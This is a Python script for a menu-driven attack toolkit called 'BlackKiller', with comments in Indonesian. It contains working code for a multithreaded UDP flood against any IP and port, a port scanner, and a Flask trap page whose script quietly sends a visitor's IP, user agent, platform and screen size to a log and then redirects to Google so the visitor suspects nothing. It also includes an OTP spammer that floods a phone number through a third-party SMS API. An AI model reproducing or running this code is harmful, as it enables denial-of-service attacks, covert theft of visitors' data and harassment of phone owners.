import os
import sys
import time
import socket
import threading
import requests
import random
import platform
import logging
import datetime
from flask import Flask, request, render_template_string
from colorama import Fore, Style, init

# --- INITIALIZATION ---
init(autoreset=True)
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- DEVELOPER CONFIG ---
DEV = "Vikk Official"
VERSION = "1.0 - REAL EXPLOIT"
LOG_FILE = "captured_data.txt"

# Neon Color Palette
R = Fore.RED
G = Fore.GREEN
C = Fore.CYAN
W = Fore.WHITE
Y = Fore.YELLOW

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def glitch_msg(text):
    for char in text:
        sys.stdout.write(f"{random.choice([R, C, W])}{char}")
        sys.stdout.flush()
        time.sleep(0.01)
    print(Style.RESET_ALL)

# --- 01. REAL DDOS ENGINE (UDP FLOOD) ---
def ddos_engine(ip, port):
    # Mengirimkan paket sampah sebesar 1024 bytes (1KB) secara terus-menerus
    packet_data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(packet_data, (ip, port))
            sys.stdout.write(f"\r{R}[ATTACK] {W}SENDING 1KB PACKET TO {ip}:{port} {R}>> {C}FORCE_FLOOD")
        except socket.error:
            pass

# --- 02. REAL PORT SCANNER ---
def scan_engine(target):
    print(f"\n{C}[*] STARTING SCAN ON: {W}{target}")
    # Daftar port kritis yang sering terbuka
    ports = [21, 22, 23, 53, 80, 443, 3306, 8080, 8443]
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((target, port))
        if result == 0:
            print(f"    {G}[+] {W}PORT {port: <5} : {G}OPEN/ACTIVE")
        s.close()

# --- 04. AUTO STEALER (BACKEND) ---
# Halaman jebakan yang akan mencuri data IP dan Device info
STEALER_HTML = """
<!DOCTYPE html><html><head><title>Loading...</title></head>
<body style="background:#000" onload="grab()">
<script>
function grab(){
    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(data=>{
        const payload = {
            ip: data.ip,
            ua: navigator.userAgent,
            plt: navigator.platform,
            res: window.screen.width + "x" + window.screen.height
        };
        fetch('/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        }).finally(() => {
            // Redirect ke situs asli setelah data dicuri agar tidak curiga
            window.location.href = "https://www.google.com";
        });
    });
}
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(STEALER_HTML)

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json
    with open(LOG_FILE, "a") as f:
        f.write(f"--- CAPTURE AT {datetime.datetime.now()} ---\n")
        f.write(f"IP Target : {d['ip']}\n")
        f.write(f"Device OS : {d['plt']}\n")
        f.write(f"Resolution: {d['res']}\n")
        f.write(f"User Agent: {d['ua']}\n")
        f.write("-" * 40 + "\n")
    return {"status": "success"}

# --- 05. REAL OTP SPAMMER ---
def spam_engine(no, jml):
    # Menggunakan API OTP publik yang aktif
    url = "https://id.jagrewala.com/v2/api/sms/check.php"
    print(f"\n{C}[*] TARGETING: {W}{no}")
    for i in range(jml):
        try:
            res = requests.get(url, params={"phone": no, "smsType": "1"}, timeout=5)
            if res.status_code == 200:
                print(f"{G}[SUCCESS] {W}OTP SENT TO {no} ({i+1})")
            time.sleep(1.5) # Delay wajib untuk menghindari rate limit API
        except:
            print(f"{R}[ERROR] {W}Connection lost.")
            break

# --- INTERFACE & BANNER ---
def banner():
    try:
        my_ip = socket.gethostbyname(socket.gethostname())
    except:
        my_ip = "127.0.0.1"
    
    print(f"""{R}
  ____  _        _    ____ _  _______ _     _     _____ ____  
 | __ )| |      / \  / ___| |/ /_   _| |   | |   | ____|  _ \ 
 |  _ \| |     / _ \| |   | ' /  | | | |   | |   |  _| | |_) |
 | |_) | |___ / ___ \ |___| . \  | | | |___| |___|  _ < 
 |____/|_____/_/   \_\____|_|\_\ |_| |_____|_____|_____|_| \_\\
    """)
    print(f"{C}╔{W}══════════════════════════════════════════════════════════════{C}╗")
    print(f"{C}║ {W}DEV  : {G}{DEV: <18} {W}IP   : {Y}{my_ip: <18} {C}║")
    print(f"{C}║ {W}VER  : {G}{VERSION: <18} {W}TIME : {Y}{datetime.datetime.now().strftime('%H:%M:%S'): <18} {C}║")
    print(f"{C}╚{W}══════════════════════════════════════════════════════════════{C}╝")

def main():
    # Jalankan server stealer di background thread
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False), daemon=True).start()
    
    while True:
        clear()
        banner()
        print(f"\n{W}[{R}01{W}] {C}DDOS ATTACK (UDP)  {W}[{R}04{W}] {C}STEALER PANEL (PORT 8080)")
        print(f"{W}[{R}02{W}] {C}PORT SCANNER       {W}[{R}05{W}] {C}WA OTP SPAMMER")
        print(f"{W}[{R}03{W}] {C}VIEW STEALER LOGS  {W}[{R}00{W}] {C}EXIT SYSTEM")

        cmd = input(f"\n{R}┌─[{DEV}@BlackKiller]\n{R}└──╼ {W}$ ")

        if cmd in ['01', '1']:
            ip = input(f"{W}Target IP: ")
            port = int(input(f"{W}Port: "))
            th = int(input(f"{W}Threads (Ex: 1000): "))
            print(f"{G}[*] Attacking {ip}... Press Ctrl+C to stop.")
            for _ in range(th):
                threading.Thread(target=ddos_engine, args=(ip, port), daemon=True).start()
            while True: time.sleep(1)

        elif cmd in ['02', '2']:
            host = input(f"{W}Target Host/IP: ")
            scan_engine(host)
            input(f"\n{Y}Press Enter to return...")

        elif cmd in ['03', '3']:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f: print(f"\n{W}" + f.read())
            else:
                print(f"{R}[!] No logs captured yet.")
            input(f"\n{Y}Press Enter to return...")

        elif cmd in ['04', '4']:
            print(f"{G}[*] Server Stealer Aktif!")
            print(f"{C}[*] Link Lokal: http://localhost:8080")
            print(f"{W}[!] Gunakan Ngrok: 'ngrok http 8080' untuk akses publik.")
            input(f"\n{Y}Press Enter to return...")

        elif cmd in ['05', '5']:
            num = input(f"{W}Number (Ex: 628xxx): ")
            jml = int(input(f"{W}Amount: "))
            spam_engine(num, jml)
            input(f"\n{Y}Press Enter to return...")

        elif cmd in ['00', '0']:
            glitch_msg("SHUTTING DOWN SYSTEM...")
            sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
